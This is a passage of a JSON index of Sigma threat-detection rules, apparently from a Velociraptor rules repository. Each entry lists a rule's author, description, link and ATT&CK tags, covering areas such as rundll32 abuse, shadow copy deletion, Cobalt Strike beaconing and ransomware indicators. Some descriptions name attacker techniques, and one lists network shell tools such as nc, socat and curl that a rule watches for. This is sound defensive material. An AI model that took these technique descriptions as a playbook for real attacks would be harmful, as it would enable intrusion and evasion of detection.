suspicious error that could be caused by exploiting attempts", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\syslog\\lnx_syslog_susp_named.yaml", "tags": ["attack.initial_access", "attack.t1190", "os.linux"], "title": "Suspicious Named Error"}, {"author": "Elastic (idea), Tobias Michalski (Nextron Systems)", "description": "Detects a privilege elevation attempt by coercing NTLM authentication on the Printer Spooler service", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_ntlmrelay.yaml", "tags": ["attack.privilege_escalation", "attack.credential_access", "attack.t1212", "windows", "evtx", "lolbas"], "title": "Suspicious NTLM Authentication on the Printer Spooler Service"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\rdp\\proc_creation_win_mstsc_run_local_rdp_file_susp_location.yaml", "tags": ["attack.command_and_control", "attack.t1219", "attack.lateral_movement", "windows", "evtx"], "title": "Suspicious Mstsc.EXE Execution With Local RDP File"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious log entries in Linux log files", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_shell_susp_log_entries.yaml", "tags": ["attack.impact", "os.linux"], "title": "Suspicious Log Entries"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the invocation of the Stored User Names and Passwords dialogue (Key Manager)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_keymgr.yaml", "tags": ["attack.credential_access", "attack.t1555.004", "windows", "evtx", "lolbas"], "title": "Suspicious Key Manager Access"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects java process spawning suspicious children", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_java_children.yaml", "tags": ["attack.execution", "attack.t1059", "os.linux"], "title": "Suspicious Java Children Processes"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects usage of \"appcmd\" to create new global URL rewrite rules. This behaviour has been observed being used by threat actors to add new rules so they can access their webshells.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\iis\\sysmon_proc_creation_win_iis_appcmd_susp_rewrite_rule.yaml", "tags": ["attack.defense_evasion", "sysmon", "windows", "evtx", "webserver.iis"], "title": "Suspicious IIS URL GlobalRules Rewrite Via AppCmd"}, {"author": "Florian Roth (Nextron Systems), Microsoft (idea)", "description": "Detects a suspicious IIS module registration as described in Microsoft threat report on IIS backdoors", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\iis\\sysmon_proc_creation_win_iis_susp_module_registration.yaml", "tags": ["attack.persistence", "attack.t1505.004", "sysmon", "windows", "evtx", "webserver.iis"], "title": "Suspicious IIS Module Registration"}, {"author": "Mikhail Larin, oscd.community", "description": "Detects commandline operations on shell history files", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_susp_histfile_operations.yaml", "tags": ["attack.credential_access", "attack.t1552.003", "os.linux"], "title": "Suspicious History File Operations - Linux"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of \"git\" in order to clone a remote repository that contain suspicious keywords which might be suspicious", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_git_clone.yaml", "tags": ["attack.reconnaissance", "attack.t1593.003", "os.linux"], "title": "Suspicious Git Clone - Linux"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious file type dropped by an Exchange component in IIS", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\webshells\\file_event_win_exchange_webshell_drop_suspicious.yaml", "tags": ["attack.persistence", "attack.t1190", "attack.initial_access", "attack.t1505.003", "sysmon", "windows", "evtx", "webserver.iis"], "title": "Suspicious File Drop by Exchange"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects flags often used with the LOLBAS Esentutl for malicious activity. It could be used in rare cases by administrators to access locked files or during maintenance.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\win_susp_esentutl_activity.yaml", "tags": ["attack.defense_evasion", "attack.execution", "attack.s0404", "attack.t1218", "lolbas", "windows", "evtx"], "title": "Suspicious Esentutl Use"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Cedric MAURUGEON (Update)", "description": "Detects a suspicious curl process start the adds a file to a web request", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_curl_fileupload.yaml", "tags": ["attack.exfiltration", "attack.t1567", "attack.t1105", "os.linux"], "title": "Suspicious Curl File Upload - Linux"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a suspicious curl process start on linux with set useragent options", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_curl_useragent.yaml", "tags": ["attack.command_and_control", "attack.t1071.001", "os.linux"], "title": "Suspicious Curl Change User Agents - Linux"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_susp_control_dll_load.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "windows", "evtx"], "title": "Suspicious Control Panel DLL Load"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects relevant commands often related to malware or hacking activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_susp_cmds.yaml", "tags": ["attack.execution", "attack.t1059.004", "os.linux"], "title": "Suspicious Commands Linux"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\beacon\\sysmon_dns_query_win_mal_cobaltstrike.yaml", "tags": ["attack.command_and_control", "attack.t1071.004", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "Suspicious Cobalt Strike DNS Beaconing - Sysmon"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a program that invoked suspicious DNS queries known from Cobalt Strike beacons", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\beacon\\win_dns_client__mal_cobaltstrike.yaml", "tags": ["attack.command_and_control", "attack.t1071.004", "windows", "evtx", "cobalt_strike"], "title": "Suspicious Cobalt Strike DNS Beaconing - DNS Client"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects suspicious child processes of the Veeam service process. This could indicate potential RCE or SQL Injection.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\database\\mssqlserver\\proc_creation_win_mssql_veaam_susp_child_processes.yaml", "tags": ["attack.initial_access", "attack.persistence", "attack.privilege_escalation", "windows", "windows.evtx", "database", "software.veaam", "software.mssql"], "title": "Suspicious Child Process Of Veeam Dabatase"}, {"author": "FPT.EagleEye Team, wagga", "description": "Detects suspicious child processes of the SQLServer process. This could indicate potential RCE or SQL Injection.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\database\\mssqlserver\\proc_creation_win_mssql_susp_child_process.yaml", "tags": ["attack.t1505.003", "attack.t1190", "attack.initial_access", "attack.persistence", "attack.privilege_escalation", "windows", "windows.evtx", "database", "software.mssql"], "title": "Suspicious Child Process Of SQL Server"}, {"author": "Teymur Kheirkhabarov, Roberto Rodriguez (@Cyb3rWard0g), Open Threat Research (OTR)", "description": "Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE accounts", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\proc_creation_win_susp_child_process_as_system_.yaml", "tags": ["attack.privilege_escalation", "attack.t1134.002", "windows", "evtx", "potato"], "title": "Suspicious Child Process Created as System"}, {"author": "Teymur Kheirkhabarov, Roberto Rodriguez (@Cyb3rWard0g), Open Threat Research (OTR)", "description": "Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE accounts", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\sysmon_proc_creation_win_susp_child_process_as_system_.yaml", "tags": ["attack.privilege_escalation", "attack.t1134.002", "sysmon", "windows", "evtx", "potato"], "title": "Suspicious Child Process Created as System"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious calls of DLLs in rundll32.dll exports by ordinal", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_by_ordinal.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "windows", "evtx", "lolbas"], "title": "Suspicious Call by Ordinal"}, {"author": "Marie Euler", "description": "Detects suspicious activities as declared by Florian Roth in its 'Best Practice Auditd Configuration'.\nThis includes the detection of the following commands; wget, curl, base64, nc, netcat, ncat, ssh, socat, wireshark, rawshark, rdesktop, nmap.\nThese commands match a few techniques from the tactics \"Command and Control\", including not exhaustively the following; Application Layer Protocol (T1071), Non-Application Layer Protocol (T1095), Data Encoding (T1132)\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_susp_c2_commands.yaml", "tags": ["attack.command_and_control", "os.linux"], "title": "Suspicious C2 Activities"}, {"author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of \"rundll32\" calling \"advpack.dll\" with potential obfuscated ordinal calls in order to leverage the \"RegisterOCX\" function", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_advpack_obfuscated_ordinal_call.yaml", "tags": ["attack.defense_evasion", "windows", "evtx", "lolbas"], "title": "Suspicious Advpack Call Via Rundll32.EXE"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious command line in which a user gets added to the local Remote Desktop Users group", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\common_commands\\proc_creation_win_susp_add_user_remote_desktop_group.yaml", "tags": ["attack.persistence", "attack.lateral_movement", "attack.t1133", "attack.t1136.001", "attack.t1021.001", "windows", "evtx", "generic"], "title": "Suspicious Add User to Remote Desktop Users Group"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious shell commands used in various exploit codes (see references)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_shell_susp_commands.yaml", "tags": ["attack.execution", "attack.t1059.004", "os.linux"], "title": "Suspicious Activity in Shell Commands"}, {"author": "Florian Roth (Nextron Systems), MSTI (query, idea)", "description": "Detects suspicious file type dropped by an Exchange component in IIS into a suspicious folder", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\webshells\\file_event_win_exchange_webshell_drop.yaml", "tags": ["attack.persistence", "attack.t1505.003", "sysmon", "windows", "evtx", "webserver.iis"], "title": "Suspicious ASPX File Drop by Exchange"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\sudo\\lnx_sudo_cve_2019_14287_user.yaml", "tags": ["attack.privilege_escalation", "attack.t1068", "attack.t1548.003", "cve.2019.14287", "os.linux"], "title": "Sudo Privilege Escalation CVE-2019-14287 - Builtin"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_sudo_cve_2019_14287.yaml", "tags": ["attack.privilege_escalation", "attack.t1068", "attack.t1548.003", "cve.2019.14287", "os.linux"], "title": "Sudo Privilege Escalation CVE-2019-14287"}, {"author": "Pawel Mazur", "description": "Detects extracting of zip file from image file", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_unzip_hidden_zip_files_steganography.yaml", "tags": ["attack.defense_evasion", "attack.t1027.003", "os.linux"], "title": "Steganography Unzip Hidden Information From Picture File"}, {"author": "Pawel Mazur", "description": "Detects appending of zip file to image", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_hidden_zip_files_steganography.yaml", "tags": ["attack.defense_evasion", "attack.t1027.003", "os.linux"], "title": "Steganography Hide Zip Information in Picture File"}, {"author": "Igor Fits, oscd.community", "description": "Detection use of the command \"split\" to split files into parts and possible transfer.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_split_file_into_pieces.yaml", "tags": ["attack.exfiltration", "attack.t1030", "os.linux"], "title": "Split A File Into Pieces - Linux"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal", "description": "Detects space after filename", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_space_after_filename_.yaml", "tags": ["attack.execution", "os.linux"], "title": "Space After Filename"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects actions that clear the local ShimCache and remove forensic evidence", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_susp_shimcache_flush.yaml", "tags": ["attack.defense_evasion", "attack.t1112", "windows", "evtx", "lolbas"], "title": "ShimCache Flush"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects shellshock expressions in log files", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_shellshock.yaml", "tags": ["attack.persistence", "attack.t1505.003", "os.linux"], "title": "Shellshock Expression"}, {"author": "Christian Burkard (Nextron Systems)", "description": "Detects shell32.dll executing a DLL in a suspicious directory", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_shell32_susp_execution.yaml", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1218.011", "windows", "evtx", "lolbas"], "title": "Shell32 DLL Execution in Suspicious Directory"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects execution of shells from a parent process located in a temporary (/tmp) directory", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_shell_child_process_from_parent_tmp_folder.yaml", "tags": ["attack.execution", "os.linux"], "title": "Shell Execution Of Process Located In Tmp Directory"}, {"author": "Florian Roth (Nextron Systems), Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community, Andreas Hunkeler (@Karneades)", "description": "Shadow Copies deletion using operating systems utilities", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\proc_creation_win_susp_shadow_copies_deletion.yaml", "tags": ["attack.defense_evasion", "attack.impact", "attack.t1070", "attack.t1490", "windows", "evtx"], "title": "Shadow Copies Deletion Using Operating Systems Utilities"}, {"author": "Florian Roth (Nextron Systems), Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community, Andreas Hunkeler (@Karneades)", "description": "Shadow Copies deletion using operating systems utilities", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_proc_creation_win_susp_shadow_copies_deletion.yaml", "tags": ["attack.defense_evasion", "attack.impact", "attack.t1070", "attack.t1490", "sysmon", "windows", "evtx"], "title": "Shadow Copies Deletion Using Operating Systems Utilities"}, {"author": "Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community", "description": "Shadow Copies creation using operating systems utilities, possible credential access", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\proc_creation_win_susp_shadow_copies_creation.yaml", "tags": ["attack.credential_access", "attack.t1003", "attack.t1003.002", "attack.t1003.003", "windows", "evtx"], "title": "Shadow Copies Creation Using Operating Systems Utilities"}, {"author": "Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community", "description": "Shadow Copies creation using operating systems utilities, possible credential access", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_proc_creation_win_susp_shadow_copies_creation.yaml", "tags": ["attack.credential_access", "attack.t1003", "attack.t1003.002", "attack.t1003.003", "sysmon", "windows", "evtx"], "title": "Shadow Copies Creation Using Operating Systems Utilities"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal", "description": "Detects suspicious change of file privileges with chown and chmod commands", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_setgid_setuid.yaml", "tags": ["attack.persistence", "attack.t1548.001", "os.linux"], "title": "Setuid and Setgid"}, {"author": "Max Altgelt (Nextron Systems), Tobias Michalski (Nextron Systems)", "description": "Detects a command that accesses password storing registry hives via volume shadow backups", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\proc_creation_win_malware_conti_shadowcopy.yaml", "tags": ["attack.impact", "attack.credential_access", "attack.t1490", "windows", "evtx", "conti"], "title": "Sensitive Registry Access via Volume Shadow Copy"}, {"author": "Daniil Yugoslavskiy, oscd.community", "description": "Detects usage of system utilities (only grep and egrep for now) to discover security software discovery", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_security_software_discovery.yaml", "tags": ["attack.discovery", "attack.t1518.001", "os.linux"], "title": "Security Software Discovery - Linux"}, {"author": "Saw Winn Naung", "description": "Checks for event id 1102 which indicates the security event log was cleared.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\tampering\\evtx\\win_security_event_log_cleared.yaml", "tags": ["attack.t1070.001", "attack.defense_evasion", "windows", "evtx"], "title": "Security Event Log Cleared"}, {"author": "CISA", "description": "Hunts for known SVR-specific scheduled task names", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Cozy-Bear\\win_taskscheduler_apt_cozy_bear_graphical_proton_task_names.yaml", "tags": ["attack.persistence", "detection.emerging_threats", "windows", "evtx", "apt.Cozy-Bear"], "title": "Scheduled Tasks Names Used By SVR For GraphicalProton Backdoor - evtx Task Scheduler"}, {"author": "CISA", "description": "Hunts for known SVR-specific scheduled task names", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Cozy-Bear\\win_security_apt_cozy_bear_scheduled_tasks_name_evtx.yaml", "tags": ["attack.persistence", "detection.emerging_threats", "windows", "evtx", "apt.Cozy-Bear"], "title": "Scheduled Tasks Names Used By SVR For GraphicalProton Backdoor - EVTX"}, {"author": "CISA", "description": "Hunts for known SVR-specific scheduled task names", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Cozy-Bear\\win_security_apt_cozy_bear_scheduled_tasks_name.yaml", "tags": ["attack.persistence", "detection.emerging_threats", "windows", "evtx"], "title": "Scheduled Tasks Names Used By SVR For GraphicalProton Backdoor"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal, oscd.community", "description": "Detects the use of at/atd which are utilities that are used to schedule tasks.\nThey are often abused by adversaries to maintain persistence or to perform task scheduling for initial or recurring execution of malicious code\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_at_command.yaml", "tags": ["attack.persistence", "attack.t1053.002", "os.linux"], "title": "Scheduled Task/Job At"}, {"author": "Alejandro Ortuno, oscd.community", "description": "Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_schedule_task_job_cron.yaml", "tags": ["attack.execution", "attack.persistence", "attack.privilege_escalation", "attack.t1053.003", "os.linux"], "title": "Scheduled Cron Task/Job - Linux"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects exploitation attempt using public exploit code for CVE-2018-15473", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\sshd\\lnx_sshd_ssh_cve_2018_15473.yaml", "tags": ["attack.reconnaissance", "attack.t1589", "os.linux"], "title": "SSHD Error Message CVE-2018-15473"}, {"author": "Agro (@agro_sev) oscd.communitly", "description": "This rule detects execution of a PowerShell code through the sqltoolsps.exe utility, which is included in the standard set of utilities supplied with the Microsoft SQL Server Management studio.\nScript blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\database\\mssqlserver\\proc_creation_win_mssql_sqltoolsps_susp_execution.yaml", "tags": ["attack.execution", "attack.t1059.001", "attack.defense_evasion", "attack.t1127", "windows", "windows.evtx", "database", "software.mssql"], "title": "SQL Client Tools PowerShell Session Detection"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a file named \"WerFault.exe\" in the WinSxS directory by a non-system process, which can be indicative of potential SNAKE malware activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\file_event_win_malware_snake_werfault_creation.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "malware.snake", "sysmon", "evtx"], "title": "SNAKE Malware WerFault Persistence File Creation"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a service named \"WerFaultSvc\" which seems to be used by the SNAKE malware as a persistence mechanism as described by CISA in their report", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\win_system_malware_snake_persistence_service.yaml", "tags": ["attack.persistence", "detection.emerging_threats"], "title": "SNAKE Malware Service Persistence"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects SNAKE malware kernel driver file indicator", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\file_event_win_malware_snake_encrypted_payload_ioc.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "malware.snake", "sysmon", "evtx"], "title": "SNAKE Malware Kernel Driver File Indicator"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects filename indicators associated with the SNAKE malware as reported by CISA in their report", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\file_event_win_malware_snake_installers_ioc.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "malware.snake", "sysmon", "evtx"], "title": "SNAKE Malware Installer Name Indicators"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects any registry event that targets the key 'SECURITY\\Policy\\Secrets\\n' which is a key related to SNAKE malware as described by CISA", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\SNAKE\\registry_event_malware_snake_covert_store_key.yaml", "tags": ["attack.persistence", "detection.emerging_threats"], "title": "SNAKE Malware Covert Store Registry Key"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects rundll32 execution where the DLL is located on a remote location (share)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_unc_path.yaml", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1021.002", "attack.t1218.011", "windows", "evtx", "lolbas"], "title": "Rundll32 UNC Path Execution"}, {"author": "CD_ROM_", "description": "Detects execution of \"rundll32.exe\" with a parent process of Explorer.exe. This has been observed by variants of Raspberry Robin, as first reported by Red Canary.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_parent_explorer.yaml", "tags": ["attack.defense_evasion", "windows", "evtx", "lolbas"], "title": "Rundll32 Spawned Via Explorer.EXE"}, {"author": "frack113", "description": "load malicious registered COM objects", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_registered_com_objects.yaml", "tags": ["attack.privilege_escalation", "attack.persistence", "attack.t1546.015", "windows", "evtx", "lolbas"], "title": "Rundll32 Registered COM Objects"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious command line patterns used when rundll32 is used to run JavaScript code", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_js_runhtmlapplication.yaml", "tags": ["attack.defense_evasion", "windows", "evtx", "lolbas"], "title": "Rundll32 JS RunHTMLApplication Pattern"}, {"author": "Christopher Peacock @securepeacock, SCYTHE @scythe_io, TactiKoolSec", "description": "An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_installscreensaver.yaml", "tags": ["attack.t1218.011", "attack.defense_evasion", "windows", "evtx", "lolbas"], "title": "Rundll32 InstallScreenSaver Execution"}, {"author": "Bartlomiej Czyz, Relativity", "description": "Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_without_parameters.yaml", "tags": ["attack.lateral_movement", "attack.t1021.002", "attack.t1570", "attack.execution", "attack.t1569.002", "windows", "evtx", "lolbas"], "title": "Rundll32 Execution Without Parameters"}, {"author": "Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou (fix + fp)", "description": "Detects the execution of rundll32 with a command line that doesn't contain a .dll file", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_executable_invalid_extension.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "windows", "evtx", "lolbas"], "title": "Rundll32 Execution Without DLL File"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lolbas\\rundll\\proc_creation_win_rundll32_no_params.yaml", "tags": ["attack.defense_evasion", "attack.t1202", "windows", "evtx", "lolbas"], "title": "Rundll32 Execution Without CommandLine Parameters"}, {"author": "@SBousseaden, Florian Roth", "description": "Detects logon events that have characteristics of events generated during an attack with RottenPotato and the like", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\win_security_susp_rottenpotato.yaml", "tags": ["attack.privilege_escalation", "attack.credential_access", "attack.t1557.001", "windows", "evtx", "potato"], "title": "RottenPotato Like Attack Pattern"}, {"author": "X__Junior (Nextron Systems)", "description": "Detects Rorschach ransomware execution activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Rorschach\\proc_creation_win_malware_rorschach_ransomware_activity_evtx.yaml", "tags": ["attack.execution", "attack.t1059.003", "attack.t1059.001", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.rorschach", "evtx", "sysmon"], "title": "Rorschach Ransomware Execution Activity - EVTX"}, {"author": "X__Junior (Nextron Systems)", "description": "Detects Rorschach ransomware execution activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Rorschach\\proc_creation_win_malware_rorschach_ransomware_activity.yaml", "tags": ["attack.execution", "attack.t1059.003", "attack.t1059.001", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.rorschach"], "title": "Rorschach Ransomware Execution Activity"}, {"author": "TropChaud", "description": "Detects the use of Rundll32 to launch an NSIS module that serves as the main stealer capability of Rhadamanthys infostealer, as observed in reports and samples in early 2023", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Rhadamanthys\\proc_creation_win_malware_rhadamanthys_stealer_dll_launch_evtx.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "detection.emerging_threats", "windows", "malware.rhadamanthys"], "title": "Rhadamanthys Stealer Module Launch Via Rundll32.EXE - EVTX"}, {"author": "TropChaud", "description": "Detects the use of Rundll32 to launch an NSIS module that serves as the main stealer capability of Rhadamanthys infostealer, as observed in reports and samples in early 2023", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\Rhadamanthys\\proc_creation_win_malware_rhadamanthys_stealer_dll_launch.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "detection.emerging_threats", "windows", "malware.rhadamanthys"], "title": "Rhadamanthys Stealer Module 